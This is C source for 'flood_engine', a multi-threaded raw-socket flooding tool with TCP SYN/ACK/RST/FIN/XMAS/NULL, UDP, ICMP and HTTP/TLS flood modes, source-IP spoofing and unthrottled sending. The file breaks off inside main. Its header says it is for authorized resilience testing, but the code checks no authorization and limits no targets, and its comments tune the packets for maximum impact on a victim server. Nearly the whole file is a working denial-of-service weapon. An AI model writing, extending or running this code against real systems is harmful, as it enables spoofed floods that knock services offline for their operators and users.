/*
 * flood_engine — raw-packet flood engine for authorized resilience testing.
 *
 * Builds packets by hand and blasts them out of raw sockets with no
 * per-packet kernel TCP state. That is what actually pushes a server over.
 *
 * Modes:
 *   syn   — raw TCP SYN, random source port + ISN (half-open table pressure)
 *   ack   — raw TCP ACK
 *   rst   — raw TCP RST+ACK (sane ack_seq: out-of-window RSTs get ignored)
 *   fin   — raw TCP FIN
 *   psh   — raw TCP PSH+ACK with payload (data-path pressure)
 *   xmas  — raw TCP FIN|PSH|URG
 *   null  — raw TCP, no flags
 *   udp   — UDP blast; --spoof switches to IP_HDRINCL so the source can vary
 *   icmp  — ICMP echo blast, fire-and-forget
 *   http  — HTTP/HTTPS request flood. --keepalive N reuses a connection for N
 *           requests (0 = never reconnect). --tls speaks TLS.
 *
 * Every mode is fire-and-forget unless --read is given. "ok" counts packets
 * the kernel accepted, not replies.
 *
 * Raw modes and udp --spoof need root or CAP_NET_RAW. udp, http and http
 * --tls run unprivileged.
 *
 * SIGINT sets the stop flag, workers drain, the result line is still printed.
 *
 * Output: JSON lines on stdout, {"type":"progress",...} then one final
 * {"type":"result",...}. Exit 3 when a raw socket is refused for lack of
 * privilege.
 *
 * Build: see Makefile (cc -O3 -std=c11 -Wall -Wextra -Werror -D_GNU_SOURCE,
 * links OpenSSL for --tls).
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

#include <openssl/err.h>
#include <openssl/ssl.h>

#define HARD_MAX_THREADS    256
#define HARD_MAX_DURATION_S 1200
#define HARD_MAX_RPS        1000000
#define MAX_PKT             2048
#define MAX_BURST           64
#define HDR_ROOM            40                     /* IP(20) + TCP(20) */
#define MAX_PAYLOAD         (MAX_PKT - HDR_ROOM)
#define MAX_TCP_PAYLOAD     1400                   /* keep under common MSS */
#define CONNECT_TIMEOUT_MS  3000
#define IO_TIMEOUT_MS       3000
#define LAT_SAMPLES         8192
#define SNDBUF_BYTES        (4 * 1024 * 1024)
#define MAX_REQ             4096

#define ICMP_ECHO_TYPE      8

typedef enum { M_SYN, M_ACK, M_RST, M_FIN, M_PSH, M_XMAS, M_NULL,
               M_UDP, M_ICMP, M_HTTP } flood_mode_t;

/* Self-declared so netinet/ip.h and netinet/ip_icmp.h cannot fight. */
struct icmp_probe {
    uint8_t  type, code;
    uint16_t checksum;
    uint16_t id, seq;
} __attribute__((packed));

typedef struct {
    flood_mode_t mode;
    char   host[256];
    char   path[512];
    char   method[16];
    char   payload_txt[256];
    int    port;
    int    duration_s;
    int    threads;
    long   rps;          /* 0 = unthrottled */
    int    burst;        /* 0 = auto */
    int    size;         /* payload bytes */
    int    ttl;
    int    spoof;
    int    read_reply;
    int    progress_ms;
    int    keepalive;    /* requests per connection, 0 = never reconnect */
    int    rand_path;
    int    tls;
    struct sockaddr_in dst;
    uint32_t src_ip;
} cfg_t;

typedef struct {
    const cfg_t *cfg;
    int      id;
    pthread_t tid;
    uint64_t rng;
    uint64_t sent, errors, refused_perm;
    uint64_t bytes;
    double   lat_us[LAT_SAMPLES];
    uint64_t lat_n;
    int      fd;
    SSL     *ssl;
    unsigned char *payload;
    char     req[MAX_REQ];
    size_t   req_len;
    unsigned char *arena;
    struct iovec  *iov;
    struct mmsghdr *msgs;
    int      burst;
} wctx_t;

static atomic_int g_stop;
static atomic_int g_perm;
static double g_start_s;
static wctx_t *g_workers;
static int g_nworkers;
static SSL_CTX *g_ctx;
static char g_sni[256];

/* ---------- clock / prng / checksums ---------- */

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}

static double now_s(void) { return (double)now_ns() / 1e9; }

static void sleep_ns(uint64_t ns) {
    struct timespec ts = { (time_t)(ns / 1000000000ull), (long)(ns % 1000000000ull) };
    nanosleep(&ts, NULL);
}

static void on_sigint(int sig) { (void)sig; atomic_store(&g_stop, 1); }

/* xorshift64* — per-thread, no locks, no libc rand contention. */
static inline uint64_t xr(uint64_t *s) {
    uint64_t x = *s;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    *s = x;
    return x * 0x2545F4914F6CDD1Dull;
}

static uint32_t sum_words(const uint8_t *p, size_t n, uint32_t sum) {
    while (n > 1) {
        sum += ((uint32_t)p[0] << 8) | (uint32_t)p[1];
        p += 2;
        n -= 2;
    }
    if (n) sum += (uint32_t)p[0] << 8;
    return sum;
}

static uint16_t fold(uint32_t s) {
    while (s >> 16) s = (s & 0xffffu) + (s >> 16);
    return (uint16_t)~s;
}

static uint16_t csum(const void *data, size_t len) {
    return fold(sum_words((const uint8_t *)data, len, 0));
}

/* Pseudo-header + segment. The caller zeroes the checksum field first. */
static uint16_t csum_l4(uint32_t src, uint32_t dst, uint8_t proto,
                        const void *seg, size_t len) {
    uint8_t pseudo[12];
    memcpy(pseudo, &src, 4);
    memcpy(pseudo + 4, &dst, 4);
    pseudo[8] = 0;
    pseudo[9] = proto;
    pseudo[10] = (uint8_t)(len >> 8);
    pseudo[11] = (uint8_t)(len & 0xff);
    uint32_t sum = sum_words(pseudo, sizeof(pseudo), 0);
    sum = sum_words((const uint8_t *)seg, len, sum);
    return fold(sum);
}

/* Routable-ish source ranges only: no 0/8, no 127/8, no 224/4, no 255.255.255.255. */
static uint32_t rand_src(void) {
    static const uint8_t firsts[] = {
        1, 5, 23, 31, 37, 45, 62, 77, 82, 91, 103, 113, 124, 151, 176, 185,
        193, 202, 212, 223
    };
    uint8_t a = firsts[rand() % (int)sizeof(firsts)];
    uint8_t b = (uint8_t)(rand() & 0xff);
    uint8_t c = (uint8_t)(rand() & 0xff);
    uint8_t d = (uint8_t)(1 + (rand() % 254));
    uint32_t v = ((uint32_t)a << 24) | ((uint32_t)b << 16) | ((uint32_t)c << 8) | d;
    return htonl(v);
}

/* ---------- packet construction ---------- */

static size_t build_icmp(wctx_t *w, unsigned char *buf) {
    const cfg_t *c = w->cfg;
    struct icmp_probe *ic = (struct icmp_probe *)buf;
    ic->type = ICMP_ECHO_TYPE;
    ic->code = 0;
    ic->id   = htons((uint16_t)(w->id + 1));
    ic->seq  = htons((uint16_t)xr(&w->rng));
    ic->checksum = 0;
    size_t plen = (size_t)c->size;
    memcpy(buf + sizeof(*ic), w->payload, plen);
    size_t total = sizeof(*ic) + plen;
    /* Raw ICMP socket: the kernel writes the IP header, we checksum ICMP only. */
    ic->checksum = csum(buf, total);
    return total;
}

static size_t build_l4_ip(wctx_t *w, unsigned char *buf) {
    const cfg_t *c = w->cfg;
    uint32_t sip = c->spoof ? rand_src() : c->src_ip;
    if (sip == 0) sip = htonl(0x0a000001u);
    if (sip == c->dst.sin_addr.s_addr) sip ^= htonl(1u);

    struct iphdr *ip = (struct iphdr *)buf;
    ip->version  = 4;
    ip->ihl      = 5;
    ip->tos      = 0;
    ip->id       = htons((uint16_t)xr(&w->rng));
    ip->frag_off = htons(0x4000);   /* DF: keep packets off the fragment path */
    ip->ttl      = (uint8_t)c->ttl;
    ip->saddr    = sip;
    ip->daddr    = c->dst.sin_addr.s_addr;
    ip->check    = 0;

    uint16_t sport = (uint16_t)(1024u + (uint32_t)(xr(&w->rng) % (65535u - 1024u)));

    if (c->mode == M_UDP) {
        struct udphdr *uh = (struct udphdr *)(buf + sizeof(*ip));
        size_t plen = (size_t)c->size;
        uh->source = htons(sport);
        uh->dest   = htons((uint16_t)c->port);
        uh->len    = htons((uint16_t)(sizeof(*uh) + plen));
        uh->check  = 0;
        memcpy(buf + sizeof(*ip) + sizeof(*uh), w->payload, plen);
        ip->protocol = IPPROTO_UDP;
        size_t seglen = sizeof(*uh) + plen;
        ip->tot_len = htons((uint16_t)(sizeof(*ip) + seglen));
        ip->check = csum(ip, sizeof(*ip));
        uh->check = csum_l4(sip, ip->daddr, IPPROTO_UDP, uh, seglen);
        if (uh->check == 0) uh->check = 0xffff;   /* 0 means "no checksum" */
        return sizeof(*ip) + seglen;
    }

    struct tcphdr *th = (struct tcphdr *)(buf + sizeof(*ip));
    memset(th, 0, sizeof(*th));
    th->source  = htons(sport);
    th->dest    = htons((uint16_t)c->port);
    th->seq     = htonl((uint32_t)xr(&w->rng));
    th->doff    = 5;
    th->window  = htons(65535);

    size_t plen = 0;
    switch (c->mode) {
        case M_SYN:  th->syn = 1; break;
        case M_ACK:  th->ack = 1; th->ack_seq = htonl((uint32_t)xr(&w->rng)); break;
        /* RST+ACK with a plausible ack_seq: a bare RST with a random seq is
           discarded by most stacks, which makes a naive RST flood inert. */
        case M_RST:  th->rst = 1; th->ack = 1;
                     th->ack_seq = htonl((uint32_t)xr(&w->rng)); break;
        case M_FIN:  th->fin = 1; break;
        case M_PSH:  th->psh = 1; th->ack = 1;
                     th->ack_seq = htonl((uint32_t)xr(&w->rng));
                     plen = (size_t)c->size;
                     memcpy(buf + sizeof(*ip) + sizeof(*th), w->payload, plen);
                     break;
        case M_XMAS: th->fin = 1; th->psh = 1; th->urg = 1; break;
        case M_NULL: break;
        default: break;
    }

    ip->protocol = IPPROTO_TCP;
    size_t seglen = sizeof(*th) + plen;
    ip->tot_len  = htons((uint16_t)(sizeof(*ip) + seglen));
    ip->check    = csum(ip, sizeof(*ip));
    th->check    = csum_l4(sip, ip->daddr, IPPROTO_TCP, th, seglen);
    return sizeof(*ip) + seglen;
}

/* ---------- sockets ---------- */

static int wait_fd(int fd, int for_write, int timeout_ms) {
    fd_set s;
    FD_ZERO(&s);
    FD_SET(fd, &s);
    struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
    return select(fd + 1, for_write ? NULL : &s, for_write ? &s : NULL, NULL, &tv);
}

/* Non-blocking connect with an explicit deadline. Returns fd (still
   non-blocking) or -1. SO_SNDTIMEO does not cover connect(), which is why a
   blocking connect() against a dead host stalls for the kernel's full SYN
   retry window instead of the configured timeout. */
static int connect_timeout(int timeout_ms) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    int flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0 || fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) { close(fd); return -1; }

    int rc = connect(fd, (struct sockaddr *)&g_workers[0].cfg->dst,
                     sizeof(g_workers[0].cfg->dst));
    if (rc != 0 && errno != EINPROGRESS) { close(fd); return -1; }
    if (rc != 0) {
        if (wait_fd(fd, 1, timeout_ms) <= 0) { close(fd); return -1; }
        int soerr = 0;
        socklen_t slen = sizeof(soerr);
        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &soerr, &slen) != 0 || soerr != 0) {
            close(fd);
            return -1;
        }
    }
    return fd;
}

static void set_blocking_timeouts(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
    struct timeval tv = { IO_TIMEOUT_MS / 1000, (IO_TIMEOUT_MS % 1000) * 1000 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
}

static SSL *tls_start(int fd, int timeout_ms) {
    SSL *ssl = SSL_new(g_ctx);
    if (!ssl) return NULL;
    SSL_set_fd(ssl, fd);
    if (g_sni[0]) SSL_set_tlsext_host_name(ssl, g_sni);
    SSL_set_connect_state(ssl);
    for (;;) {
        int r = SSL_connect(ssl);
        if (r == 1) return ssl;
        int err = SSL_get_error(ssl, r);
        if (err == SSL_ERROR_WANT_READ) {
            if (wait_fd(fd, 0, timeout_ms) <= 0) break;
        } else if (err == SSL_ERROR_WANT_WRITE) {
            if (wait_fd(fd, 1, timeout_ms) <= 0) break;
        } else {
            break;
        }
    }
    SSL_free(ssl);
    return NULL;
}

static int x_write(int fd, SSL *ssl, const void *buf, size_t len) {
    const unsigned char *p = buf;
    size_t left = len;
    while (left) {
        int n = ssl ? SSL_write(ssl, p, (int)left)
                    : (int)send(fd, p, left, MSG_NOSIGNAL);
        if (n <= 0) {
            if (ssl) {
                int err = SSL_get_error(ssl, n);
                if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) continue;
            } else if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        p += n;
        left -= (size_t)n;
    }
    return 0;
}

/* ---------- http ---------- */

static void build_request(wctx_t *w) {
    const cfg_t *c = w->cfg;
    bool has_body = (strcmp(c->method, "POST") == 0 ||
                     strcmp(c->method, "PUT") == 0 ||
                     strcmp(c->method, "PATCH") == 0);
    char path[640];
    if (c->rand_path) {
        snprintf(path, sizeof(path), "%s%c_=%lx%lx",
                 c->path, strchr(c->path, '?') ? '&' : '?',
                 (unsigned long)xr(&w->rng), (unsigned long)xr(&w->rng));
    } else {
        snprintf(path, sizeof(path), "%s", c->path);
    }

    size_t body_len = has_body ? (size_t)c->size : 0;
    int n = snprintf(w->req, sizeof(w->req),
                     "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: hackit-flood/2.0\r\n"
                     "Accept: */*\r\nConnection: %s\r\n",
                     c->method, path, c->host,
                     c->keepalive == 1 ? "close" : "keep-alive");
    if (n < 0 || (size_t)n >= sizeof(w->req)) { w->req_len = 0; return; }
    if (body_len) {
        int m = snprintf(w->req + n, sizeof(w->req) - (size_t)n,
                         "Content-Length: %zu\r\nContent-Type: text/plain\r\n\r\n", body_len);
        if (m < 0 || (size_t)(n + m) >= sizeof(w->req)) { w->req_len = 0; return; }
        n += m;
        size_t room = sizeof(w->req) - (size_t)n;
        size_t copy = body_len < room ? body_len : room;
        memcpy(w->req + n, w->payload, copy);
        n += (int)copy;
    } else {
        if ((size_t)n + 2 >= sizeof(w->req)) { w->req_len = 0; return; }
        memcpy(w->req + n, "\r\n", 2);
        n += 2;
    }
    w->req_len = (size_t)n;
}

static void record_lat(wctx_t *w, double us) {
    if (w->lat_n < LAT_SAMPLES) {
        w->lat_us[w->lat_n++] = us;
    } else {
        uint64_t j = xr(&w->rng) % (w->lat_n + 1);
        if (j < LAT_SAMPLES) w->lat_us[j] = us;
    }
}

/* One request. Reuses w->fd/w->ssl while the keepalive budget lasts. */
static int http_one(wctx_t *w) {
    const cfg_t *c = w->cfg;

    if (w->fd < 0) {
        int fd = connect_timeout(CONNECT_TIMEOUT_MS);
        if (fd < 0) return -1;
        if (c->tls) {
            SSL *ssl = tls_start(fd, CONNECT_TIMEOUT_MS);
            if (!ssl) { close(fd); return -1; }
            set_blocking_timeouts(fd);
            w->fd = fd;
            w->ssl = ssl;
        } else {
            set_blocking_timeouts(fd);
            w->fd = fd;
        }
    }

    build_request(w);
    if (!w->req_len) return -1;

    uint64_t t0 = now_ns();
    if (x_write(w->fd, w->ssl, w->req, w->req_len) != 0) {
        if (w->ssl) { SSL_free(w->ssl); w->ssl = NULL; }
        close(w->fd);
        w->fd = -1;
        return -1;
    }

    if (c->read_reply) {
        char rb[512];
        int r = w->ssl ? SSL_read(w->ssl, rb, (int)sizeof(rb) - 1)
                       : (int)recv(w->fd, rb, sizeof(rb) - 1, 0);
        if (r <= 0) {
            if (w->ssl) { SSL_free(w->ssl); w->ssl = NULL; }
            close(w->fd);
            w->fd = -1;
            return -1;
        }
        rb[r] = '\0';
        int status = -1;
        if (r > 12 && strncmp(rb, "HTTP/", 5) == 0) status = atoi(rb + 9);
        if (status >= 500) return -1;
    }

    w->bytes += w->req_len;
    record_lat(w, (double)(now_ns() - t0) / 1000.0);

    if (c->keepalive != 0) {
        w->conns++;
        if (c->keepalive > 0 && w->conns >= c->keepalive) {
            if (w->ssl) { SSL_free(w->ssl); w->ssl = NULL; }
            close(w->fd);
            w->fd = -1;
            w->conns = 0;
        }
    }
    return 0;
}

/* ---------- dispatch ---------- */

/* Destination always travels in msg_name, so the socket never needs connect().
   The earlier version relied on a connected socket and swallowed connect()
   failure, leaving sendmmsg with no address at all. */
static int send_batch(wctx_t *w, int n) {
    const cfg_t *c = w->cfg;

    if (c->mode == M_HTTP) {
        int done = 0;
        for (int i = 0; i < n; i++) {
            if (http_one(w) == 0) done++;
            else w->errors++;
        }
        return done;
    }

    int built = 0;
    for (int i = 0; i < n; i++) {
        unsigned char *p = w->arena + (size_t)i * MAX_PKT;
        size_t len;
        if (c->mode == M_ICMP) {
            len = build_icmp(w, p);
        } else if (c->mode == M_UDP && !c->spoof) {
            /* Plain UDP socket: the kernel writes IP+UDP, we supply payload. */
            len = (size_t)c->size;
            memcpy(p, w->payload, len);
        } else {
            len = build_l4_ip(w, p);
        }
        w->iov[i].iov_base = p;
        w->iov[i].iov_len  = len;
        w->msgs[i].msg_hdr.msg_name    = (void *)&c->dst;
        w->msgs[i].msg_hdr.msg_namelen = sizeof(c->dst);
        w->msgs[i].msg_hdr.msg_iov     = &w->iov[i];
        w->msgs[i].msg_hdr.msg_iovlen  = 1;
        built++;
    }

    int rc = sendmmsg(w->fd, w->msgs, (unsigned)built, 0);
    if (rc < 0) {
        if (errno == EPERM || errno == EACCES) {
            atomic_store(&g_perm, 1);
            atomic_store(&g_stop, 1);
        }
        return -1;
    }
    /* Count only what actually left the socket: sendmmsg can return short
       under pressure, and bandwidth is the headline metric here. */
    for (int i = 0; i < rc; i++) w->bytes += w->iov[i].iov_len;
    return rc;
}

static void *worker(void *arg) {
    wctx_t *w = (wctx_t *)arg;
    const cfg_t *c = w->cfg;

    uint64_t interval_ns = 0;
    if (c->rps > 0) {
        interval_ns = 1000000000ull * (uint64_t)c->threads / (uint64_t)c->rps;
        if (interval_ns == 0) interval_ns = 1;
    }

    double deadline = g_start_s + (double)c->duration_s;
    uint64_t next = now_ns();

    while (!atomic_load(&g_stop) && now_s() < deadline) {
        int m = send_batch(w, w->burst);
        if (m < 0) {
            w->errors++;
        } else {
            w->sent += (uint64_t)m;
        }
        if (interval_ns) {
            next += interval_ns * (uint64_t)(m > 0 ? m : 1);
            uint64_t nw = now_ns();
            if (next > nw) {
                sleep_ns(next - nw);
            } else if (nw - next > 50000000ull) {
                next = nw;   /* stalled: resync instead of spiralling */
            }
        }
    }

    if (w->ssl) { SSL_free(w->ssl); w->ssl = NULL; }
    if (w->fd >= 0) { close(w->fd); w->fd = -1; }
    return NULL;
}

/* ---------- reporting ---------- */

static const char *mode_name(flood_mode_t m) {
    switch (m) {
        case M_SYN: return "syn";
        case M_ACK: return "ack";
        case M_RST: return "rst";
        case M_FIN: return "fin";
        case M_PSH: return "psh";
        case M_XMAS: return "xmas";
        case M_NULL: return "null";
        case M_UDP: return "udp";
        case M_ICMP: return "icmp";
        default: return "http";
    }
}

static int cmp_double(const void *a, const void *b) {
    double da = *(const double *)a, db = *(const double *)b;
    return (da > db) - (da < db);
}

static double percentile(const double *sorted, size_t n, double p) {
    if (n == 0) return 0.0;
    double idx = p / 100.0 * (double)(n - 1);
    size_t lo = (size_t)idx;
    size_t hi = lo + 1;
    if (hi >= n) return sorted[lo];
    double frac = idx - (double)lo;
    return sorted[lo] * (1.0 - frac) + sorted[hi] * frac;
}

static void *monitor(void *arg) {
    int progress_ms = *(int *)arg;
    while (!atomic_load(&g_stop)) {
        struct timespec ts = { progress_ms / 1000, (long)(progress_ms % 1000) * 1000000L };
        nanosleep(&ts, NULL);
        if (atomic_load(&g_stop)) break;
        double elapsed = now_s() - g_start_s;
        if (elapsed <= 0.0) continue;
        uint64_t sent = 0, err = 0, bytes = 0;
        for (int i = 0; i < g_nworkers; i++) {
            sent  += g_workers[i].sent;
            err   += g_workers[i].errors;
            bytes += g_workers[i].bytes;
        }
        printf("{\"type\":\"progress\",\"elapsed_s\":%.3f,\"requests\":%llu,\"ok\":%llu,"
               "\"errors\":%llu,\"achieved_rps\":%.2f,\"mbps\":%.3f}\n",
               elapsed, (unsigned long long)sent, (unsigned long long)sent,
               (unsigned long long)err, (double)sent / elapsed,
               (double)bytes * 8.0 / elapsed / 1e6);
        fflush(stdout);
    }
    return NULL;
}

static void json_escape(const char *in, char *out, size_t out_sz) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j + 2 < out_sz; i++) {
        unsigned char ch = (unsigned char)in[i];
        if (ch == '"' || ch == '\\') { out[j++] = '\\'; out[j++] = (char)ch; }
        else if (ch >= 0x20) out[j++] = (char)ch;
    }
    out[j] = '\0';
}

static void usage(const char *prog) {
    fprintf(stderr,
        "usage: %s <syn|ack|rst|fin|psh|xmas|null|udp|icmp|http> <host> [port] [options]\n"
        "  --duration N     seconds (1-%d, default 10)\n"
        "  --threads N      worker threads (1-%d, default 4)\n"
        "  --rps N          global packet rate cap, 0 = unthrottled (default 0)\n"
        "  --burst N        packets per syscall, 0 = auto (default 0)\n"
        "  --size N         payload bytes for udp/icmp/psh/http (default 64)\n"
        "  --ttl N          IP TTL for raw modes (default 64)\n"
        "  --spoof          randomise the source IP (raw modes; udp switches to a raw socket)\n"
        "  --method M       http verb: GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS (default GET)\n"
        "  --path P         http path (default /)\n"
        "  --keepalive N    http: requests per connection, 0 = never reconnect (default 1)\n"
        "  --rand-path      http: append a random query string per request\n"
        "  --tls            http: speak TLS (implied when --port is 443)\n"
        "  --read           http: also read the status line (default: send and move on)\n"
        "  --payload S      payload text for udp/icmp/psh (default hackit-flood)\n"
        "  --progress-ms N  progress line interval, 0 = silent (default 500)\n",
        prog, HARD_MAX_DURATION_S, HARD_MAX_THREADS);
}

static int parse_mode(const char *s, flood_mode_t *out) {
    static const struct { const char *n; flood_mode_t m; } tab[] = {
        {"syn", M_SYN}, {"ack", M_ACK}, {"rst", M_RST}, {"fin", M_FIN},
        {"psh", M_PSH}, {"xmas", M_XMAS}, {"null", M_NULL},
        {"udp", M_UDP}, {"icmp", M_ICMP}, {"http", M_HTTP},
    };
    for (size_t i = 0; i < sizeof(tab) / sizeof(tab[0]); i++) {
        if (strcmp(s, tab[i].n) == 0) { *out = tab[i].m; return 0; }
    }
    return -1;
}

/* One raw/udp socket per worker. Returns fd or -1. Sets *perm on EPERM. */
static int open_flood_socket(const cfg_t *c, int *perm) {
    int fd;
    *perm = 0;

    if (c->mode == M_HTTP) return -1;

    if (c->mode == M_ICMP) {
        fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (fd < 0) { if (errno == EPERM || errno == EACCES) *perm = 1; return -1; }
    } else if (c->mode == M_UDP && !c->spoof) {
        fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) return -1;
    } else {
        int proto = (c->mode == M_UDP) ? IPPROTO_UDP : IPPROTO_TCP;
        fd = socket(AF_INET, SOCK_RAW, proto);
        if (fd < 0) { if (errno == EPERM || errno == EACCES) *perm = 1; return -1; }
        int one = 1;
        if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) != 0) {
            close(fd);
            return -1;
        }
    }

    int sndbuf = SNDBUF_BYTES;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    /* Bound a blocked sendmmsg so SIGINT is observed promptly. */
    struct timeval tv = { 1, 0 };
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    if (c->mode == M_ICMP || (c->mode == M_UDP && !c->spoof)) {
        setsockopt(fd, IPPROTO_IP, IP_TTL, &c->ttl, sizeof(c->ttl));
    }
    return fd;
}

int main(int argc, char **argv) {
    if (argc < 3) { usage(argv[0]); return 2; }

    cfg_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    if (parse_mode(argv[1], &cfg.mode) != 0) { usage(argv[0]); return 2; }

    bool needs_port = (cfg.mode != M_ICMP);
    if (needs_port && argc < 4) { usage(argv[0]); return 2; }

    snprintf(cfg.host, sizeof(cfg.host), "%s", argv[2]);
    cfg.port = needs_port ? atoi(argv[3]) : 0;
    snprintf(cfg.path, sizeof(cfg.path), "/");
    snprintf(cfg.method, sizeof(cfg.method), "GET");
    snprintf(cfg.payload_txt, sizeof(cfg.payload_txt), "hackit-flood");
    cfg.duration_s = 10;
    cfg.threads = 4;
    cfg.rps = 0;
    cfg.burst = 0;
    cfg.size = 64;
    cfg.ttl = 64;
    cfg.progress_ms = 500;
    cfg.keepalive = 1;

    int opt_start = needs_port ? 4 : 3;
    if (!needs_port && argc > 3 && argv[3][0] != '-') opt_start = 4;

    for (int i = opt_start; i < argc; i++) {
        if      (!strcmp(argv[i], "--duration") && i + 1 < argc) cfg.duration_s = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--threads")  && i + 1 < argc) cfg.threads = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--rps")      && i + 1 < argc) cfg.rps = atol(argv[++i]);
        else if (!strcmp(argv[i], "--burst")    && i + 1 < argc) cfg.burst = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--size")     && i + 1 < argc) cfg.size = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--ttl")      && i + 1 < argc) cfg.ttl = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--keepalive") && i + 1 < argc) cfg.keepalive = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--method")   && i + 1 < argc) snprintf(cfg.method, sizeof(cfg.method), "%s", argv[++i]);
        else if (!strcmp(argv[i], "--path")     && i + 1 < argc) snprintf(cfg.path, sizeof(cfg.path), "%s", argv[++i]);
        else if (!strcmp(argv[i], "--payload")  && i + 1 < argc) snprintf(cfg.payload_txt, sizeof(cfg.payload_txt), "%s", argv[++i]);
        else if (!strcmp(argv[i], "--progress-ms") && i + 1 < argc) cfg.progress_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--spoof"))    cfg.spoof = 1;
        else if (!strcmp(argv[i], "--read"))     cfg.read_reply = 1;
        else if (!strcmp(argv[i], "--rand-path")) cfg.rand_path = 1;
        else if (!strcmp(argv[i], "--tls"))      cfg.tls = 1;
        else { usage(argv[0]); return 2; }
    }

    if (cfg.duration_s < 1) cfg.duration_s = 1;
    if (cfg.duration_s > HARD_MAX_DURATION_S) cfg.duration_s = HARD_MAX_DURATION_S;
    if (cfg.threads < 1) cfg.threads = 1;
    if (cfg.threads > HARD_MAX_THREADS) cfg.threads = HARD_MAX_THREADS;
    if (cfg.rps < 0) cfg.rps = 0;
    if (cfg.rps > HARD_MAX_RPS) cfg.rps = HARD_MAX_RPS;
    if (cfg.burst < 0) cfg.burst = 0;
    if (cfg.burst > MAX_BURST) cfg.burst = MAX_BURST;
    if (cfg.burst == 0) cfg.burst = cfg.rps == 0 ? 32 : 1;
    if (cfg.keepalive < 0) cfg.keepalive = 0;
    if (cfg.ttl < 1) cfg.ttl = 1;
    if (cfg.ttl > 255) cfg.ttl = 255;
    if (cfg.mode == M_HTTP && cfg.port == 443) cfg.tls = 1;
    if (cfg.size < 0) cfg.size = 0;
    if (cfg.mode == M_PSH) {
        if (cfg.size > MAX_TCP_PAYLOAD) cfg.size = MAX_TCP_PAYLOAD;
        if (cfg.size == 0) cfg.size = 64;
    } else if (cfg.mode != M_UDP && cfg.mode != M_ICMP && cfg.mode != M_HTTP) {
        cfg.size = 0;
    } else if (cfg.size > MAX_PAYLOAD) {
        cfg.size = MAX_PAYLOAD;
    }

    {
        struct addrinfo hints = {0}, *res = NULL;
        char service[8];
        hints.ai_family = AF_INET;
        hints.ai_socktype = (cfg.mode == M_ICMP) ? 0 : SOCK_STREAM;
        snprintf(service, sizeof(service), "%d", cfg.port);
        if (getaddrinfo(cfg.host, needs_port ? service : NULL, &hints, &res) != 0) {
            fprintf(stderr, "flood_engine: cannot resolve %s\n", cfg.host);
            return 2;
        }
        memcpy(&cfg.dst, res->ai_addr, sizeof(struct sockaddr_in));
        freeaddrinfo(res);
    }

    /* Local source address the kernel would pick for this destination. */
    {
        int probe = socket(AF_INET, SOCK_DGRAM, 0);
        cfg.src_ip = 0;
        if (probe >= 0) {
            struct sockaddr_in me;
            socklen_t ml = sizeof(me);
            if (connect(probe, (struct sockaddr *)&cfg.dst, sizeof(cfg.dst)) == 0 &&
                getsockname(probe, (struct sockaddr *)&me, &ml) == 0) {
                cfg.src_ip = me.sin_addr.s_addr;
            }
            close(probe);
        }
    }

    if (cfg.mode == M_HTTP && cfg.tls) {
        snprintf(g_sni, sizeof(g_sni), "%s", cfg.host);
        OPENSSL_init_ssl(0, NULL);
        g_ctx = SSL_CTX_new(TLS_client_method());
        if (!g_ctx) {
            fprintf(stderr, "flood_engine: TLS context failed\n");
            return 1;
        }
        SSL_CTX_set_min_proto_version(g_ctx, TLS1_2_VERSION);
        SSL_CTX_set_verify(g_ctx, SSL_VERIFY_NONE, NULL);
    }

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = on_sigint;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    g_start_s = now_s();
    g_nworkers = cfg.threads;
    g_workers = calloc((size_t)cfg.threads, sizeof(wctx_t));
    if (!g_workers) { fprintf(stderr, "flood_engine: out of memory\n"); return 1; }

    for (int i = 0; i < cfg.threads; i++) {
        wctx_t *w = &g_workers[i];
        w->cfg = &cfg;
        w->id = i;
        w->fd = -1;
        w->rng = (uint64_t)now_ns() ^ ((uint64_t)(i + 1) * 0x9E3779B97F4A7C15ull);
        w->burst = cfg.burst;
